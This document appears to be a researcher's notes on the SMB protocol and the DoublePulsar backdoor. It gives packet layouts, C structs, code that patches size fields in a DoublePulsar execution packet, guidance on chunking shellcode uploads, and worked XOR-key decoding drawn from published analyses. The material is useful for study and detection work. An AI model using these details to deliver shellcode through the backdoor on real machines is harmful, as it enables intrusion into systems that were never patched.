/////////////////////////////////////////////////////////////////////////////////////
NetBIOS information is 4 bytes in length

#pragma pack(1)
//struct __attribute__((__packed__)) net_bios
typedef struct
{
	uint16_t type;
	uint16_t length;
} net_bios;
#pragma pop

The length field contains the size of the SMB packet in big endian format.
Everything else in the SMB packet is in little endian format

This was a major confusing factor.  If a packet containing the:
NetBios Header + SMB Header + Trans2 header + 12 Byte parameters + Payload length of 4096

This max sized packet would equal 4178 bytes in total size in memory.  HOWEVER, in the NetBIOS header
the NetBIOS header does NOT contain the size of itself and just the size of the rest of the packet at that point.

So a NetBIOS header would say 4174 bytes in length if the packet has a total size of 4178.

When calculating the value to place into the NetBIOS header.
Calculate it this way and remember to use htons to flip it to big endian format which is what NetBIOS requires.
Do not use a little endian format for the NetBIOS header.

//calculate the size
unsigned short NetBios_Header_Size = htons(EntireShellcodeSize + 12 + 70 - 4);

//The calculation occurs as follows: EntireShellcode size could be: 4096
//12 for the parameters
//70 is the size of the Execution skeleton packet which ALREADY contains a NetBIOS header size of 4
//So the Execution Packet skeleton ( size of 70 bytes ) already contains 4 bytes of a NetBIOS header
and is truly only 66 bytes in length without the NetBIOS header.

//place the value of NetBios_Header_Size in the SMB packet and edit the previous value
memcpy((unsigned char*)Your_SMB_Packet + 2, (char*)&NetBios_Header_Size, 2);



/////////////////////////////////////////////////////////////////////////////////////
SMB packet information:

SMB packet response layout
NetBIOS Data     //smb_response[0][1][2][3]
server_component //smb_response[4][5][6][7]
smb_command 	 // smb_response[8]
error_class 	 // smb_response[9]
reserved1 	 // smb_response[10]
error_code 	 // smb_response[11][12]
flags 		 // smb_response[13]
flags2 		 // smb_response[14][15]
process_id_high  // smb_response[16][17]
signature 	 // smb_response[18][19][20][21][22][23][24][25]
reserved2 	 // smb_response[26][27]
tree_id 	 // smb_response[28][29]
process_id 	 // smb_response[30][31]
user_id 	 // smb_response[32][33]
multiplex_id 	 // smb_response[34][35]

SMB signature needed for XOR key calculation resides at:
SMB Packet response [18] [19] [20] [21] [22] [23] [24] [25]

tree_id      [28] [29]
process_id   [30] [31]
user_id      [32] [33]
multiplex_id [34] [35]

////////////////////////////////////////////////
Other values that were required by Doublepulsar in the SMB packet

These values are only a max of 4096.  If you are sending a 5 MB shellcode file or something
You must make a loop through them and have no more than 4096 for TotalDataCount & DataCount.
ByteCount = SizeOfshellcode + 13. 

I have no idea why it is 13 and not 12. Since ByteCount adds 13 to the previous limit of 4096.
The highest value ByteCount can go is 4109. 

//patch other values
unsigned short TotalDataCount = EntireShellcodeSize;
unsigned short DataCount = EntireShellcodeSize;
unsigned short byteCount = EntireShellcodeSize + 13;

//Use first method
*(WORD*)(Doublepulsar_Execution_Packet + 0x27) = TotalDataCount;
*(WORD*)(Doublepulsar_Execution_Packet + 0x3b) = DataCount;
*(WORD*)(Doublepulsar_Execution_Packet + 0x43) = byteCount;

//Use second method
memcpy((unsigned char*)Doublepulsar_Execution_Packet + 0x27, (char*)&TotalDataCount, 2);
memcpy((unsigned char*)Doublepulsar_Execution_Packet + 0x3b, (char*)&DataCount, 2);
memcpy((unsigned char*)Doublepulsar_Execution_Packet + 0x43, (char*)&byteCount, 2);

////////////////////////////////////////////////
UserID position in SMB response is [32] and [33]
TreeID position in SMB response is [28] and [29]

NT_STATUS position in SMB response is (backwards / little-endian format) [9] [10] [11] [12]
If you're looking for 0xc0000205
Then it will be written this way:
recvbuff[9] == 0x05 && recvbuff[10] == 0x02 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)

SMB packet headers in hex depending on which type it is:
Negociate Protocol Request:               0x72
Session Setup AndX Request:            0xff, 0x73
Tree Connect AndX Request:             0xff, 0x75
Trans2 Request SESSION_SETUP   0x32
NT Trans Request                              0xa0
Trans2 Secondary Request:               0x33
Echo Request:                                     0x2b

#define SMB_COM_TRANSACTION         0x25
#define SMB_COM_TRANSACTION_SECONDARY 0x26
#define SMB_COM_ECHO                0x2B

#define SMB_COM_TRANSACTION2        0x32
#define SMB_COM_TRANSACTION2_SECONDARY 0x33

#define SMB_COM_TREE_CONNECT        0x70
#define SMB_COM_TREE_DISCONNECT     0x71

#define SMB_COM_NEGOTIATE           0x72
#define SMB_COM_SESSION_SETUP_ANDX  0x73
#define SMB_COM_LOGOFF_ANDX         0x74
#define SMB_COM_TREE_CONNECT_ANDX   0x75

#define SMB_COM_NT_TRANSACT         0xA0
#define SMB_COM_NT_TRANSACT_SECONDARY 0xA1
#define SMB_COM_NT_CREATE_ANDX      0xA2
#define SMB_COM_NT_CANCEL           0xA4

#define SMBCLOSE			0x04

#define NEGOTIATEPROTOCOLREQUEST 0x72
#define SESSIONSETUPANDX	0x73
#define SESSIONLOGOFF       0x74
#define TREECONNETANDX		0x75
#define NTCREATEANDX		0xa2

/*
You must pack this structure

Use #pragma pack(1) and #pragma pop

or typedef struct __attribute__((__packed__)) 
if you are on Linux

*/
typedef struct {
	uint16 SmbMessageType; //0x00
	uint16 SmbMessageLength; 
	uint8 ProtocolHeader[4]; //"\xffSMB"
	uint8 SmbCommand; 
	uint32 NtStatus; //0x00000000
	uint8 flags; //0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16 flags2;  //0xC001 (Unicode & Nt error types & longfilename support
	uint16 ProcessIDHigh; //0x00
	uint8 signature[8]; //0x00000000000
	uint16 reserved; //0x0000
	uint16 TreeId; 
	uint16 ProccessID; //0xfeff
	uint16 UserID; 
	uint16 multipleID;  //Incremental 64bytes en cada request.
	char buffer[16384]; // Custom SmbCommand data
} smheader;

typedef struct {
	uint8 WordCount;
	uint16 TotalParameterCount;
	uint16 TotalDataCount;
	uint16 MaxParameterCount;
	uint16 MaxDataCount;
	uint8 MaxSetupCount;
	uint8 reserved;
	uint16 flags;
	uint32 timeout; //0x00000000
	uint16 reserved2;
	uint16 ParameterCount;
	uint16 ParameterOffset;
	uint16 DataCount;
	uint16 DataOffset;
	uint8 SetupCount; 
	uint8 reserved3;
	uint16 Function; //0x0026 for openscManager - Find_First2
	uint16 FID;
	uint16 ByteCount; 
	uint8 padding;
	uint8 TransactionName[14];
	uint16 padding2;
	//DCERPC struct
	//Microosft ServiceControl
} SMB_COM_TRANSACTION_STRUCT;

typedef struct {
	uint8 WordCount; //Number of parameters in this struct
	uint8 AndXCommand; //0xff no further command
	uint8 reserved2; //0x00
	uint16 AndXOffset; 

	uint16 MaxBuffer; 
	uint16 MaxMpxCount; 
	uint16 VcNumber; //0x0000
	uint32 SessionKey; //0x00000000
	uint16 SecurityBloblength; 
	uint32 reserved3; //0x00000000
	uint32 capabilities; //0x200000D4
	uint16 ByteCount; 
} SessionSetupAndX;


typedef struct {
	uint8 WordCount; //Number of parameters in this struct
	uint8 AndXCommand; //0xff no further command
	uint8 reserved2; //0x00
	uint16 AndXOffset; 
	uint16 Action;
	uint16 SecurityBloblength; 
	uint16 ByteCount;
//	uint8 padding;
} SessionSetupAndXResponse; 


typedef struct {
	uint8 WordCount;
	uint16 ByteCount;
//	DIALECT *Dialects;
    char *Dialects;
} NegotiateProtocolRequest;


typedef struct {
	uint8 WordCount; //Number of parameters in this struct
    uint16 DialecIndex;
    uint8 SecurityMode;
    uint16 MaxMxpCount;
    uint16 MaxVcs;
    uint32 MaxBufferSize;
    uint32 MaxRawBuffer;
    uint32 SessionKey;
    uint32 Capabilities;
    //uint64 ServerTime;
    uint8  ServerTime[8];
    uint16 ServerTimeZone;
    uint8 KeyLength;
    uint16 ByteCount;
    uint8 ServerGuid[16];
} NegotiateProtocolResponse; 


typedef struct {
	uint8 WordCount; 
	uint8 AndXCommand; //0xff no further command
	uint8 reserved2; //0x00
	uint16 AndXOffset; 
	uint16 flags;
	uint16 PasswordLen;	//Set to 0x01
	uint16 ByteCount; 
	uint8 Password; //Set to 0x00
    //resource
    //service ????\0
} TreeConnectAndX; 

typedef struct {
	uint8 WordCount; 
	uint16 ByteCount; 
} TreeConnectAndXResponse;

typedef struct {
	uint8 WordCount; //0x24
	uint16 FID; //0xff no further command
	uint32 LastWrite;
	uint16 ByteCount;
} CLOSE;


July 26 2020 update:
DoublePulsar backdoor upload packet information

Sources:
https://www.microsoft.com/security/blog/2017/06/30/exploring-the-crypt-analysis-of-the-wannacrypt-ransomware-smb-exploit-propagation/
https://shasaurabh.blogspot.com/2017/05/doublepulsar-backdoor.html

Trans2.SESSION_SETUP.Parameters information:

The data is 12 bytes longâ€”the first four bytes indicate total length
the next four bytes is reserved, and the last 4 bytes are the current offsets of the payload bytes in little-endian. 
These fields are encoded with master XOR key
Because the reserved field is supposed to be 0, the reserved field is actually the same as the master XOR key. 
Going back to the packet capture above, the reserved field value is 0x38a9dbb6, which is the master XOR key. 
The total length is encoded as 0x38f9b8be. When this length is XORed with the master XOR key, it is 0x506308
which is the actual length of the payload bytes being uploaded. 
The last field is 0x38b09bb6. When XORed with the master key, this last field becomes 0, 
meaning this packet is the first packet of the payload upload.

Trans2.SESSION_SETUP.Parameters is of 0xC (12) bytes and contains below information encrypted by XOR key.
1. Total Size of Payload
2. Chunk Size
3. Offset of Chunk in Payload

Trans2.SESSION_SETUP.Parameters value = 6a620858 62015858 62115858
Total Size of Payload = (0x5808626a) ^ (0x58581162) = 0x507308
 Chunk Size = (0x58580162) ^ (0x58581162) = 0x1000(4096)
Offset of Chunk in Payload = (0x58581162) ^ (0x58581162) = 0

Another example of Trans2.SESSION_SETUP.Parameters value = 6a620858 62015858 62015858
Total Size of Payload = (0x5808626a) ^ (0x58581162) = 0x507308
Chunk Size = (0x58580162) ^ (0x58580162) = 0x1000(4096)
Offset of Chunk in Payload = (0x58580162) ^ (0x58581162) = 0x1000(4096)
